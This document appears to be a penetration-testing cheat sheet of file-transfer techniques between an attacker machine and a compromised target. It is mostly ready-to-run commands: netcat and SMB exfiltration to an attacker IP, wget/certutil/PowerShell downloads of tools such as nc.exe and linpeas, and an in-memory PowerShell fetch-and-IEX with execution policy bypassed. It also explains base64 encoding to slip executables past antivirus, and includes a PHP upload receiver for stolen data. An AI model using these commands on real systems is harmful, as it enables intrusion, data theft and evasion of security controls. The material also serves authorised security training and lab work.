# Transfering Files

## Netcat File Transfer

* Step 1
* Create a file on the target box in the /tmp directory

```
touch file.txt
```

* Set up the listener and direct STDOUT into the new file

```
nc -nlvp 1234 > file.txt
```

\-Send the file

```
nc [target box ip] 1234 < file-to-be-transfered.txt
```

#### Method Two

* On attacker run:

```
nc -lvp 443> transfer.txt
```

* On target run:

```
cat transfer.txt | nc $attackerip 443
```

### NC Transfer with gzip data

```
//on target machine 
nc -nvlp 10000 | gzip -d > .y
//local machine 
cat ~/tools/static-binaries/socat/socat | gzip -c - | nc 127.0.0.1 10000
// check md5 hashes match on both systems
```

## Web Servers:

### Python HTTP Server File Transfer

* Start the Python Server in the directory where the file is located that you want to transfer
* Use the ip address assigned to your box, if there is a vpn involved use the vpn address

```
python3 -m http.server
```

* Above is for python3

```
python -m SimpleHTTPServer 8000
```

* Above is for python
* You can optionally specify a port that you want the server to run on (it defaults to 8000)

```
python3 -m http.server 80
```

* Wget the file from the target box

```
wget http://172.16.6.1:8000/linpeas.sh
```

* Change permissions

```
chmod +x linpeas.sh
```

* Run the transfered file

```
./linpeas.sh
```

### PHP Web Server

```
php -S $ip:80
```

### Metasploit Web Server

```
use auxiliary/server/ftp
auxiliary/server/tftp
```

## SMB File Transfer

* On kali box:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

* On Windows (update the IP address with your Kali IP):

```
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
#Reverse Copy FROM Windows
copy output.txt \\10.10.14.22\kali\output.txt
```

#### SMB2 Support

* If you recieve this error when attempting to transfer files:

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Restart your smbserver.py with this option at the end:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support
```

## Wget

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh	Download a file using Wget
```

## Curl

```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh	Download a file using cURL
```

## PHP Download

```
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'	
```

## Secure Copy Protocol

* SCP a file from your attack box to a target box

```
scp /home/kali/Documents/linpeas.sh user@10.10.10.100:/tmp
```

* This command copies the file linpeas.sh to user on the target box and places it in the /tmp directory.
* SCP a file from your attack box while on the command line of a target box and place it in your present working directory.

```
scp jack@172.16.6.1:/home/kali/Documents/linpeas.sh .
```

#### SCP More Example Usage

* Upload a file using SCP

```
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip	
```

* Download a file using SCP

```
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe	
```

## Windows Specific Downloads

### CertUtil.exe

* Windows has a built-in command line program called CertUtil.exe which is installed as part of Certificate Services and can be used to manage certificates in Windows.
* CertUtil is also known as living off land LOL binary which is a trusted preinstalled system tool.
* It can even bypass security features by base64 encoding the malware.

```
certutil -urlcache -split -f [url] [filename.extension]
certutil -urlcache -f [url] [filename.extension] [filename.extension]
```

* `-urlcache` Displays or deletes URL cache entries
* `-f` Forces fetching a specific URL and updating the cache
* `-split` Split embedded ASN.1 elements, and saves files on disk
* Using the encoding may help bypass security controls in certutil.
* Using the `-decode` option we can download a Base-64 encoded malicious executable such as a text file and decode the executable to disk.
* This can bypass antivirus, edge devices and filtering.
* First we need to base64 encode the netcat executable.

```
certutil.exe -encode [inputfilename] [encoded output filename]
```

* To verify that the nc.txt file contains text, we can run the following command to print the first 10 lines to the terminal:

```
powershell -command "Get-Content nc.txt -Head 10"
```

* Now we have to transfer the text file to the target and decode it back to an executable.

```
certutil.exe -urlcache -split -f "http://[attack box ip]/nc.txt" nc.txt
```

* And the following command decodes the base64

```
certutil.exe -decode nc.txt nc.exe
```

### Powershell downloads:System.Net.WebClient

* First example uses .NET class System.Net.WebClient.
* The following commands create a Powershell script on the remote Windows machine that can be used to download the file from the attack box:

```
echo $webclient = New-Object System.Net.WebClient > httpdownload.ps1
echo $webclient.DownloadFile("[Download URL]","[File Name]") >> httpdownload.ps1
```

* Note that you have to insert the download link and filename in the command on the last line and replace all the bold with the URL and the filename.
* Once verified that the PS script is created we can execute with:

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1
```

* Alternatively we can also execute the command from a regular command line in Windows powershell to download files without creating a script

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('[Download URL]','[File Name]')"
```

* The -c option executes the command provided within the double quotes with Powershell.

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.3.1/nc.exe','nc.exe')"
```

* The default execution policy is ‘Restricted’ which means the system will not run Powershell scripts.
* With the following powershell command we can get the current execution policy:

```
Get-ExecutionPolicy
```

* We can now set the policy to ‘Unrestricted’:

```
Set-ExecutionPolicy Unrestricted
```

#### Loading Script into Memory with powershell

* The script can be loaded into memory with powershell&#x20;

```
powershell.exe -nop -ep bypass (new-object system.net.webclient).downloadstring('http://10.10.15.49/PowerView.ps1') | IEX
#or 
(new-object system.net.webclient).downloadstring('http://10.10.15.49/PowerView.ps1') | IEX
```

### Powershell Downloads: Start-BitsTransfer

* Another way to download files with Powershell is by using the Background Intelligent Transfer Service (BITS).
* The Start-BitsTransfer cmdlet creates a BITS transfer job to transfer one or more files between a client computer and a server.
* BITS has to be enabled on the target machine in order for it to work.
* The following command will download nc.exe from a remote web server to the C drive:

```
powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[attack box ip]/nc.exe -Destination C:\
```

### Powershell Downloads: Invoke-WebRequest

* The Invoke-WebRequest cmdlet is simple and easy to use and is available in Powershell version 3.0 and higher.
* Downloading large files with this method may cause memory issues.
* Recommended to use the System.Net.Web.Client method for transferring large files.

```
powershell Invoke-WebRequest -Uri http://[ip attack box]/nc.exe -OutFile C:\nc.exe
```

* For this cmdlet to work the target host needs to have at least Powershell 3.0
* You can check the version of Powershell by using the following command

```
powershell $PSVersionTable.PsVersion
```

### **Upload Windows data through HTTP Post request**

make /var/www/upload.php on kali

```
<?php
$uploaddir = '/var/www/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Upload file in Windows client

```
powershell (New-Object System.Net.WebClient).UploadFile('http://<IP>/upload.php', '<FILE>')
```

### **VBS download files for Windows XP**

Create vbs script

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Run VBS script to download file

```
cscript wget.vbs http://<IP>/<FILE> <FILE>
```

## I am Stuck

* If u ever happen to have a shell of a UNIX system, and cannot find a way to upload anything, this is a lifesaver trick you can try:
* On local system:

```
cat filetoupload | base64 -w 0; echo
```

* Double click on output to copy
* On Target System:

```
echo <copiedContent> | base64 -d > filetoupload
```
